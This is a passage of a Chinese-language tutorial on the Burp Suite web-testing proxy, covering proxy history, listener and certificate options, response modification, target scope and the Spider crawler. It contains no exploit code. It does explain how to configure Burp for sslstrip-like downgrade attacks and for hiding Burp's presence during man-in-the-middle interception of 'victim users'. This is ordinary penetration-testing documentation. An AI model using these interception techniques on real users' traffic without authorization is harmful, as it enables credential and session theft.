src="https://wooyun.js.org/images_result/images/2014101711120669655.png" alt="Image013" title="image013.png"></p><h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><p>代理历史认为每个请求和响应。通过代理可以记录全部请求和响应。您可以过滤和注释这个信息来帮助管理它，并使用代理的历史来测试流程。History(代理历史)总在更新，即使你把Interception turned off(拦截关闭)，允许浏览不中断的同时还监测应用流量的关键细节。</p><h4 id="History-Table"><a href="#History-Table" class="headerlink" title="History Table"></a>History Table</h4><p>表中显示已通过代理HTTP消息的所有请求，并且可以查看完整的你所做的任何修改和截获的信息的请求和响应。 表中包含以下字段：</p><p><code># (请求索引号)、Host(主机)、Method(请求方式)、URL(请求地址)、Params(参数)、Edited(编辑)、Status(状态)、Length(响应字节长度)、MIME type(响应的MLME类型)、Extension(地址文件扩展名)、Title(页面标题)、Comment(注释)、SSL、IP(目标IP地址)、Cookies、Time(发出请求时间)、Listener port(监听端口)</code>。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120687800.png" alt="Image015" title="image015.png"></p><p>您可以通过单击任何列标题进行升序或降序排列。如果您在表中双击选择一个项目地址，会显示出一个详细的请求和响应的窗口。或者右击选择 <code>Show new history window</code></p><p><img src="https://wooyun.js.org/images_result/images/2014101711120625578.png" alt="Image017" title="image017.png"></p><h3 id="Display-Filter"><a href="#Display-Filter" class="headerlink" title="Display Filter"></a>Display Filter</h3><p>Proxy histroy有一个可以用来在视图中隐藏某些内容的功能，以使其更易于分析和你感兴趣的工作内容的显示过滤。 History Table上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120694811.png" alt="Image019" title="image019.png"></p><h4 id="Request-type"><a href="#Request-type" class="headerlink" title="Request type"></a>Request type</h4><p>Show only in-scope items–勾选则显示在范围内的项目，反之。</p><h4 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h4><p>您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。</p><h4 id="Status-code"><a href="#Status-code" class="headerlink" title="Status code"></a>Status code</h4><p>您可以设定是否要显示或隐藏各种HTTP状态码响应。</p><h4 id="Search-term"><a href="#Search-term" class="headerlink" title="Search term"></a>Search term</h4><p>您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“Negative search (消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。</p><h4 id="File-extension"><a href="#File-extension" class="headerlink" title="File extension"></a>File extension</h4><p>您可以设定是否要显示或隐藏指定的文件扩展名的项目。</p><h4 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h4><p>您可以设定是否显示使用用户提供的评论或仅亮点项目。</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>你可以只显示特定的监听端口上接收的项目。测试访问控制时可能有用。 如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究了大量代理的历史来理解各种不同的请求显示。</p><h3 id="Annotations"><a href="#Annotations" class="headerlink" title="Annotations"></a>Annotations</h3><p>您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。 两种方式添加亮点： 1)使用在最左边的表列中的下拉菜单中突出显示单个项目。 2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。 两种方法添加注释： 1)双击相关条目，注释列中，添加或编辑就地评论。 2)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。 除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。</p><h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><p>设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。</p><h3 id="Proxy-Listeners"><a href="#Proxy-Listeners" class="headerlink" title="Proxy Listeners"></a>Proxy Listeners</h3><p>代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120626419.png" alt="Image021" title="image021.png"></p><h4 id="1-Binding"><a href="#1-Binding" class="headerlink" title="1)Binding"></a>1)Binding</h4><p>这些设置控制Burp怎么代理监听器绑定到本地网络接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bind to port---这是将被打开侦听传入连接的本地接口上的端口。你将需要使用一个没有被绑定被其他应用程序的闲置端口。</span><br><span class="line">Bind to address---这是Burp绑定到本地接口的IP地址。</span><br></pre></td></tr></table></figure><p>您可以绑定到刚刚127.0.0.1接口或所有接口，或任何特定的本地IP地址。</p><p>注意：如果监听器绑定到所有接口或特定的非loopback接口，那么其他计算机可能无法连接到该侦听器。这可能使他们发起出站连接，从您的IP地址发起，并以访问代理服务器历史的内容，其中可能包含敏感数据，如登录凭据。你应该只启用此当你位于一个受信任的网络上。</p><p>BurpSuite让您创建多个代理服务器的侦听器，并提供了丰富的控制自己的行为的配置选项。你可能偶尔需要进行测试时不寻常的应用，或与一些非基于浏览器的HTTP客户端进行合作，利用这些选项。</p><h4 id="2-Request-Handling"><a href="#2-Request-Handling" class="headerlink" title="2)Request Handling"></a>2)Request Handling</h4><p>这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：</p><p><strong>Redirect to host</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于浏览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配&#x2F;替换规则重写的主机头中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。</p><p><strong>Redirect to port</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。</p><p><strong>Force use of SSL</strong> - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。</p><p>注意：每一个重定向选项都可以单独使用。因此，例如，可以将所有请求重定向到一个特定的主机，同时保留原来的端口和协议在每个原始请求中使用。隐形BurpProxy的支持允许非代理感知客户端直接连接到监听。</p><h4 id="3-Certificate"><a href="#3-Certificate" class="headerlink" title="3)Certificate"></a>3)Certificate</h4><p>这些设置控制呈现给客户端的SSL服务器的SSL证书。使用这些选项可以解决一些使用拦截代理时出现的SSL问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你可以消除您的浏览器的SSL警报，并需要建立SSL例外。 </span><br><span class="line">凡网页加载来自其他域的SSL保护的项目，您可以确保这些均可由浏览器加载，而不需要先手动接受每个引用的域代理的SSL证书。 </span><br><span class="line">您可以与拒绝连接到服务器，如果接收到无效的SSL证书胖客户端应用程序的工作。 </span><br></pre></td></tr></table></figure><p>下列选项可用：</p><p><strong>Use a self-signed certificate</strong>—||-一个简单的自签名SSL证书提交给您的浏览器，它总是导致SSL警告。</p><p><strong>Generate CA-signed per-host certificate</strong>—||-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。</p><p><strong>Generate a CA-signed certificate with a specific hostname</strong>—||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。</p><p><strong>Use a custom certificate</strong>—||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。</p><h4 id="4-Exporting-and-Importing-the-CA-Certificate"><a href="#4-Exporting-and-Importing-the-CA-Certificate" class="headerlink" title="4)Exporting and Importing the CA Certificate"></a>4)Exporting and Importing the CA Certificate</h4><p>您可以导出您安装特定的CA证书在其他工具或BurpSuite的其他情况下使用，并且可以导入证书Burp在当前实例使用。 您可以选择要导出的证书只（用于导入到您的浏览器或其他设备的信任），或者你可以同时导出的证书及其私钥。</p><p>注意：您不应该透露的私钥证书给任何不可信的一方。拥有你的证书和密钥的恶意攻击者可能可以，即使你不使用Burp拦截浏览器的HTTPS流量。</p><p>您也可以仅通过访问http:&#x2F;&#x2F;burp&#x2F;cert在浏览器中导出证书。它使HTTPS请求您的浏览器相同的证书，但在一些移动设备上安装时，设备通过一个URL来下载它是有帮助的。</p><h3 id="Interception-Options"><a href="#Interception-Options" class="headerlink" title="Interception Options"></a>Interception Options</h3><p>设置控制哪些请求和响应都停滞用于查看和编辑在拦截选项卡。单独的设置将应用到请求和响应。</p><p>在“Intercept”复选框确定是否有讯息拦截。如果它被选中，然后Burp应用配置的规则对每个消息，以确定它是否应该被拦截。</p><p>个别规则可以激活或停用对每个规则的左边的复选框。规则可以被添加，编辑，删除，或使用按钮重新排序。规则可以在消息，包括域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie ，头&#x2F;主体内容，状态代码，MIME类型， HTML页面标题和代理的几乎任何属性进行配置侦听端口。您可以配置规则来只拦截项目的网址是目标范围之内的。可以使用正则表达式对定义复杂的匹配条件。</p><p>规则按顺序处理，并且使用布尔运算符AND和OR组合。这些都与处理简单的“从左到右”的逻辑，其中每个算子的范围，如下所示：（所有规则之前累积的结果）和&#x2F;或（当前规则的结果）所有活动的规则在每封邮件进行处理，并最终活动规则应用后的结果确定消息是否被拦截或转发的背景。“自动更新内容长度”复选框控件时，这已被用户修改是否Burp自动更新消息的Content-Length头。使用这个选项通常是必不可少的，当HTTP主体已被修改。</p><p>如果有需求，可以在请求结束时自动修复丢失或多余的新行。如果编辑请求不包含标题下面一个空行，Burp会添加此。如果与含有URL编码参数的身体的编辑请求包含任何换行符在身体的末端，Burp就会删除这些。这个选项可以是有用的纠正，而手动编辑在拦截视图的要求，以避免发出无效的请求向服务器发出的错误。</p><h3 id="Response-Modification"><a href="#Response-Modification" class="headerlink" title="Response Modification"></a>Response Modification</h3><p>设置用于执行自动响应的修改。您可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">显示隐藏的表单字段。 （有一个子选项，以突出强调取消隐藏栏在屏幕上，便于识别。 ）</span><br><span class="line">启用已禁用的表单域</span><br><span class="line">删除输入字段长度限制</span><br><span class="line">删除的JavaScript表单验证</span><br></pre></td></tr></table></figure><p>下列选项可用于禁止客户端逻辑用于测试目的（注意，这些特征并非设计用来作为NoScript的的方式进行安全防御）有用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除所有的JavaScript。</span><br><span class="line">删除&lt;object&gt;标记。</span><br></pre></td></tr></table></figure><p>下列选项可用于提供对受害用户的流量在不知不觉中被通过BurpSuite代理sslstrip般的攻击。您可以在与听者选项强制SSL的传出请求，以有效地从用户的连接剥离SSL一起使用这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">转换HTTPS为HTTP的链接。</span><br><span class="line">删除cookie安全标志。</span><br></pre></td></tr></table></figure><h3 id="Match-and-Replace"><a href="#Match-and-Replace" class="headerlink" title="Match and Replace"></a>Match and Replace</h3><p>用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，以及任何适用的替代品制成。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。</p><p>在替换字符串，组可以使用其次为索引$引用。所以下面的替换字符串将包含被匹配在上述正则表达式，该标记的名称：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120634416.png" alt="Image023" title="image023.png"></p><h3 id="SSL-Pass-Through"><a href="#SSL-Pass-Through" class="headerlink" title="SSL Pass Through"></a>SSL Pass Through</h3><p>用于指定目标Web服务器为其Burp会直接通过SSL连接。关于通过这些连接的请求或响应任何细节将在代理拦截视图或历史。</p><p>通过SSL连接传递可以在这情况下是不能直接消除了客户端的SSL错误是非常有用 - 例如，在执行SSL证书钉扎的移动应用程序。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定问题的主机仍然可以让您以正常方式使用Burp其他交通工作。</p><p>如果启用该选项来自动添加客户端SSL协商失败的项目，然后BurpSuite会在客户端失败的SSL协议检测（例如，由于不承认BurpSuite的CA证书），并会自动将相关的服务器添加到SSL通通过列表。</p><h3 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h3><p>控制Burp代理的行为的一些具体细节。下列选项可用：</p><p><strong>Use HTTP&#x2F;1.0 in requests to server</strong> - 该选项控制BurpSuite代理是否强制在请求目标服务器的HTTP 1.0版。默认设置是使用任何的HTTP版本所使用的浏览器。然而，一些遗留服务器或应用程序可能需要1.0版本才能正常工作。</p><p><strong>Use HTTP&#x2F;1.0 in responses to client</strong> - 目前所有的浏览器都支持这两个版本1.0和HTTP 1.1 。从1.0版本开始已经减少了一些功能，迫使使用1.0版本有时会很有用，以控制浏览器的行为的各个方面，例如防止企图执行HTTP流水线。</p><p><strong>Set response header “Connection:close”</strong> - 这个选项也可能是有用的，以防止HTTP流水线在某些情况下。</p><p><strong>Unpack gzip &#x2F; deflate in requests</strong> - 某些应用程序（通常是那些使用自定义客户端组件） ，压缩在请求消息体。该选项控制BurpProxy是否自动解压缩压缩请求主体。请注意，某些应用程序可能被破坏，如果他们期望的压缩体和压缩已通过Burp被删除。</p><p><strong>Unpack gzip &#x2F; deflate in responses</strong> - 大多数浏览器接受的gzip和响应紧缩压缩的内容。该选项控制BurpSuite代理是否自动解压缩压缩响应机构。请注意，您可以经常防止服务器试图通过删除请求（可能使用BurpProxy的匹配和替换功能）的Accept-Encoding头压缩的响应。 Disable web interface at http:&#x2F;&#x2F;burp - 如果你不得不配置你的听众接受无保护的接口上的连接，并希望阻止他人接触到Burp浏览器控件，此选项可能有用。</p><p><strong>Suppress Burp error messages</strong> - 当某些错误时，默认情况下BurpSuite返回有意义的错误信息到浏览器。如果你想在隐身模式下运行Burp，履行人在这方面的中间人攻击的受害者用户，那么它可能是有用的抑制这些错误信息来掩盖一个事实，即Burp是参与。</p><p><strong>Disable logging to history and site map</strong> - 此选项可以防止Burp从记录任何请求到代理服务器的历史或目标站点地图。如果您使用的是Burp代理对于一些特定用途，如身份验证到上游服务器或进行匹配和替换操作，并且要避免产生内存和存储开销采伐牵扯它可能是有用的。</p><p><strong>Enable interception at startup</strong>- 此选项可让您设定是否在Burp时启动代理截获应该启用。您可以选择始终启用拦截，始终禁用拦截，或者从Burp上次关闭恢复设置。</p><h2 id="Target功能"><a href="#Target功能" class="headerlink" title="Target功能"></a>Target功能</h2><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。</p><h3 id="Using-Burp-Target"><a href="#Using-Burp-Target" class="headerlink" title="Using Burp Target"></a>Using Burp Target</h3><p>在地址栏输入www.baidu.com，如图</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120617724.jpg" alt="Image025" title="image025.jpg"></p><p>这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤</p><p><img src="/../images_result/images/2014101711120751588.jpg" alt="Image027" title="image027.jpg"></p><p>针对地址右击显示当前可以做的一些动作操作等功能。左图 针对文件右击显示当前可以做一些动作操作等功能。右图</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120751588.jpg" alt="Image029" title="image029.jpg"> <img src="https://wooyun.js.org/images_result/images/2014071402582281360.jpg" alt="Image031" title="image031.jpg"></p><h3 id="2-Scope"><a href="#2-Scope" class="headerlink" title="2)Scope"></a>2)Scope</h3><p>这个主要是配合Site map做一些过滤的功能，如图：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120768777.png" alt="Image033" title="image033.png"></p><p>Include in scope就是扫描地址或者拦截历史记录里右击有个add to scope就是添加到这了，也可以自己手动添加。</p><p>Target分为site map和scope两个选项卡</p><h4 id="SiteMap"><a href="#SiteMap" class="headerlink" title="SiteMap"></a>SiteMap</h4><p>中心Site Map汇总所有的信息Burp已经收集到的有关地址。你可以过滤并标注此信息，以帮助管理它，也可以使用SiteMap来手动测试工作流程。</p><h4 id="Target-Information"><a href="#Target-Information" class="headerlink" title="Target Information"></a>Target Information</h4><p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。</p><p>该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 。如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求&#x2F;响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。</p><p>站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所有这一切都通过代理服务器直接请求的资源。</span><br><span class="line">已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider） 。</span><br><span class="line">内容使用Spider或内容发现功能查找。</span><br><span class="line">由用户手动添加的任何项目，从其它工具的输出。</span><br></pre></td></tr></table></figure><p>已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色。默认情况下（与被动蜘蛛(passviely scan this host)启用） ，当你开始浏览一个典型的应用，大量的内容将显示为灰色之前，你甚至得到尽可能要求，因为BurpSuite发现在您所请求的内容链接到它。您可以删除不感兴趣的地址</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120832954.png" alt="Image035" title="image035.png"></p><h4 id="Display-Filter-1"><a href="#Display-Filter-1" class="headerlink" title="Display Filter"></a>Display Filter</h4><p>Sitemap可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容的显示过滤器 Sitemap上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p><p>Request type 你可以只显示在范围内的项目，只能与反应项目，或者带参数的请求。 MIME type 您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。 Status code 您可以设定是否要显示或隐藏各种HTTP状态码响应。 Search term 您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“消极搜索”选项，然后不匹配的搜索词唯一的项目将被显示。 File extension 您可以设定是否要显示或隐藏指定的文件扩展名的项目。 Annotation 您可以设定是否显示使用用户提供的评论或仅亮点项目。</p><h4 id="Annotations-1"><a href="#Annotations-1" class="headerlink" title="Annotations"></a>Annotations</h4><p>通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。</p><p>您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。</p><p>两种方式添加亮点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1)使用在最左边的表列中的下拉菜单中突出显示单个项目。</span><br><span class="line">2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。</span><br><span class="line">两种方法添加注释：</span><br><span class="line">3)双击相关条目，注释列中，添加或编辑就地评论。</span><br><span class="line">4)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。</span><br></pre></td></tr></table></figure><p>除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。</p><h4 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h4><p>Target scope设置，可以从SiteMap中添加也可以手动添加扫描范围到Scope。你可以在Target SiteMap和Proxy history上设置只显示在范围内的项目。并且可以设置代理拦截只有在范围内的请求和响应。Spider会扫描在范围内的地址。专业版还可以设置自动启动在范围内项目的漏洞扫描。您可以配置Intruder和Repeater跟随重定向到任何在范围内的网址。发送Burp目标以适当的方式执行行动，只针对你感兴趣并愿意攻击项目。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711120869997.png" alt="Image037" title="image037.png"></p><p>范围定义使用的URL匹配规则两个表 - 一个“包括(include)”列表和“exclude(排除)”列表中。Burp根据一个URL地址来决定，如果它是目标范围之内，这将被视为是在范围上如果URL匹配至少一个“include”在内的规则，不符合“exclude”规则。这样能够定义特定的主机和目录为大致范围内，且距离该范围特定的子目录或文件（如注销或行政职能）排除。</p><h2 id="Spider功能"><a href="#Spider功能" class="headerlink" title="Spider功能"></a>Spider功能</h2><p>Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。 结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序 视图。能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量 的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应 用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。</p><h3 id="Using-Burp-Spider"><a href="#Using-Burp-Spider" class="headerlink" title="Using Burp Spider"></a>Using Burp Spider</h3><p>要对应用程序使用 Burp Spider 需要两个简单的步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可 以关闭代理拦截)。 </span><br><span class="line">2 到站点地图的”target”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的” spider this host/branch”选项。</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101711120832553.png" alt="Image039" title="image039.png"></p><p>你也可以在任何 Burp 工具的任意请求或响应上使用上下文菜单上选择” spider this item”。当你发送一个站点地图的分支来 spidering，Spider 会首先检查这个分支是否在定义好的spidering 的范围内。如果不是，Burp 会提示你是否把相关的 URL 添加到范围里。然后，Burp 开始 spidering，并执行下面的操作：</p><p>在分支上，请求那些已被发现的还没被请求过的 URL。 在分支上，提交那些已被发现但提交 URL 错误的表单。 重复请求分支上的先前收到的状态码为 304 的项，为检索到一个应用程序的新(未进入缓存)副本。 对所有的检索到内容进行解析以确认新的 URL 和表单。 只有发现新内容就递归地重复这些步骤。 继续在所有的范围区域内 spidering，直到没有新内容为止。</p><p>注意 Spider 会跟踪任何在当前定义的 spidering 范围内的 URL 链接。如果你定义了一个 范围比较大的目标，并且你只选择了其中的一个分支来 spidering，这时 Spider 会跟踪所有进入到这个比较大的范围内的链接，于是也就不在原来的分支上 spider。为了确保 Spider 只在指定分支内的请求上，你应该在开始时，就把 spidering 范围配置为只在这个分支上。</p><p>你应该小心地使用 Burp Spider。在它的默认设置上，Spider 会在 spidering 范围内使用 默认输入值，自动地提交任意表格，并且会请求许多平常用户在只使用一个浏览器不会发出 的请求。如果在你定义范围的 URL 是用来执行敏感操作的，这些操作都会被带到应用程序 上。在你完全地开始自动探索内容之前，使用浏览器对应用程序进行一些手动的映射，是非常可取的。</p><h3 id="Control-tab"><a href="#Control-tab" class="headerlink" title="Control tab"></a>Control tab</h3><p>这个选项是用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。</p><h4 id="Spider-Status"><a href="#Spider-Status" class="headerlink" title="Spider Status"></a>Spider Status</h4><p><img src="https://wooyun.js.org/images_result/images/2014101711120887420.png" alt="Image041" title="image041.png"></p><h4 id="1-Spider-running"><a href="#1-Spider-running" class="headerlink" title="1)Spider running"></a>1)Spider running</h4><p>这个是用来开始和停止 Spider。Spider 停止后，它自己不会产生请求，但它会 继续处理通过 Burp Proxy 的响应，并且在 spidering 范围内的新发现的项都会送入请求队列 里，当 Spider 重新启动时，再来请求。这里显示的一些 Spider 进度的指标，让你能看到剩余的内容和工作量的大小。</p><h4 id="2-Clear-queues"><a href="#2-Clear-queues" class="headerlink" title="2)Clear queues"></a>2)Clear queues</h4><p>如果你想改变你工作的优先权，你可以完全地清除当前队列的项目，来让其他 的项目加入队列。注意如果被清除的项目如果还在范围内并且 Spider 的分析器发现有新的 链接到这个项目，那么它们还会加入队列。</p><h4 id="Spider-Scope"><a href="#Spider-Scope" class="headerlink" title="Spider Scope"></a>Spider Scope</h4><p>在这个面板里，你能精确地定义 Spider 的请求范围。最好的方法通常是使用一套广泛的目标范围，默认情况下，蜘蛛会使用该范围。如果您需要定义不同范围的蜘蛛使用，然后选择“Use custom scope(使用自定义范围)”。进一步的配置面板会出现在相同的方式套件范围的目标范围内面板的功能。如果你使用自定义范围并向 Spider 发送不在范围内 的项，则 Burp 会自动更新这个自定义的范围而不是 Suite 范围。</p><h4 id="Options-tab"><a href="#Options-tab" class="headerlink" title="Options tab"></a>Options tab</h4><p>这个选项里包含了许多控制 Burp Spider 动作的选项，如下描述。这些设置在 spider 启 动后还可以修改的，并且这修改对先前的结果也是有效的。例如，如果增加了最大链接深度， 在以前的最大链接深度外的链接如果满足现在的条件，也会加入到请求队列里。</p><h4 id="Crawler-Settings"><a href="#Crawler-Settings" class="headerlink" title="Crawler Settings"></a>Crawler Settings</h4><p><img src="https://wooyun.js.org/images_result/images/2014101711120858563.png" alt="Image043" title="image043.png"></p><h4 id="1-check-robots-txt"><a href="#1-check-robots-txt" class="headerlink" title="1)check robots.txt"></a>1)check robots.txt</h4><p>如果这个选项被选中，Burp Spider会要求和处理robots.txt文件，提取内容链接。这个文件是由机器人排除协议控制的蜘蛛状制剂在互联网上的行为。请注意，注意 Burp Spider不会确认 robots 排除协议。Burp Spider 会列举出目标应用程序的所有内容，请求所有在范围 内的 robots.txt 条目。</p><h4 id="2-detect-custom-“not-found”-responses"><a href="#2-detect-custom-“not-found”-responses" class="headerlink" title="2)detect custom “not found” responses"></a>2)detect custom “not found” responses</h4><p>HTTP协议需要向Web服务器返回404状态码，如果一个请求的资源不存在。然而，许多Web应用程序返回使用不同的状态代码定制为“not found”的网页。如果是这种情况，则使用该选项可以防止误报的网站内容的映射。Burp Spider从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测定制“not found”的回应。</p><h4 id="3-ignore-links-to-non-text-content"><a href="#3-ignore-links-to-non-text-content" class="headerlink" title="3)ignore links to non-text content"></a>3)ignore links to non-text content</h4><p>常常需要推断出在 HTML 上下文里链接到特殊资源的 MIME 类型。例如，带有 IMG 标记的 URL 会返回图像；那些带有 SCRIPT 标记的会返回 JavaScript。 如果这个选项被选中，Spider 不会请求在这个上下文出现的出现的非文本资源。使用这个选 项，会减少 spidering 时间，降低忽略掉感兴趣内容的风险。</p><h4 id="4-request-the-root-of-all-directories-如果这个选项被选中，Burp-Spider-会请求所有已确认的目标-范围内的-web-目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的，-这选项将是非常的有用。"><a href="#4-request-the-root-of-all-directories-如果这个选项被选中，Burp-Spider-会请求所有已确认的目标-范围内的-web-目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的，-这选项将是非常的有用。" class="headerlink" title="4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。"></a>4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。</h4><h4 id="5-make-a-non-parameterised-request-to-each-dynamic-page"><a 